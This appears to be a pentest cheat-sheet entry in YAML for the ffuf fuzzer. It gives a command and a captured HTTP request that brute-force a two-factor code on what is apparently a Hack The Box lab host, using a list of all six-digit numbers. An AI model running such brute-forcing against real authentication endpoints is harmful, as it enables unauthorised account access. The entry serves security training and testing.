---
description: |
  ffuf is a fast web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records)and GET and POST parameter fuzzing. 

  Command Reference:
  ```
  Burprequest in file: req

  Protocol: https

  Wordlist with placeholder to replace (FUZZ): /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ

  ```
command: |
  ffuf -request req -request-proto https -w /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ > ffuf.out

code: |
  POST /2fa.html HTTP/2
  Host: teamcity-dev.coder.htb
  Cookie: __test=1; RememberMe=394468061^2#-7089909565306817793; TCSESSIONID=55B00B03A2687F2331142FB623BF2CCC
  Accept: application/json
  Origin: https://teamcity-dev.coder.htb

  password=FUZZ  

items:
  - No_creds
services:
  - Web
OS:
  - Windows
  - Linux
attack_types:
  - Enumeration
references:
  - https://github.com/ffuf/ffuf
  - https://www.freecodecamp.org/news/web-security-fuzz-web-applications-using-ffuf/
---